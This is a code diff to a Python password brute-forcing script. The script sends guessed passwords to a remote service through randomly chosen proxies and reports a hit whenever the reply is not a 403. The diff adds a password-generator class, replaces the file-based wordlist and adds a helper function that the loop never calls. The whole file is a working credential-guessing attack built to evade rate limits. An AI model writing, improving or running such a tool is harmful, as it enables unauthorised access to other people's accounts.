@@ -1,5 +1,6 @@
 from sngol import make_request
 from proxy import is_bad_proxy, validate_proxy_list, read_proxy_file
+from passgen import PassGen
 import random
 import string
 
@@ -36,25 +37,24 @@ else:
     else:
         print(f"{len(proxy_list)} {'proxy' if len(proxy_list) == 1 else 'proxies'} are ready to use!")
 
-def load_wordlist(file_path):
+def check_pass(password, proxy):
+    print(f"Checking password {password} with {proxy}...")
     try:
-        with open(file_path, 'r') as file:
-            wordlist = file.read().splitlines()
-        return wordlist
-    except FileNotFoundError:
-        return None
+        response = make_request(password, proxy)
+            
+        if response.status_code != 403:
+            print(f"Success!!  | {response.text}")
+        else:
+            print(f"Failure :( | {response.text}")
+    except Exception as e:
+        print(f"Something bad happened... {e}")
+        exit()
 
-def generate_password(charset, length):
-    return ''.join(random.choice(charset) for _ in range(length))
-
-wordlist = load_wordlist('wordlist.txt')
-charset = string.ascii_letters + string.digits
-password_length = 8
+passgenerator = PassGen(8)
+wordlist = passgenerator.wordlist
 
 if wordlist:
-    wordlist_index = 0
-    while True:
-        password = wordlist[wordlist_index]
+    for password in wordlist:
         proxy = random.choice(proxy_list)
         
         print(f"Checking password {password} with {proxy}...")
@@ -69,13 +69,9 @@ if wordlist:
         except Exception as e:
             print(f"Something bad happened... {e}")
             exit()
-
-        wordlist_index += 1
-        if wordlist_index >= len(wordlist):
-            wordlist_index = 0
 else:
     while True:
-        password = generate_password(charset, password_length)
+        password = passgenerator.generate_password()
         proxy = random.choice(proxy_list)
         
         print(f"Checking password {password} with {proxy}...")
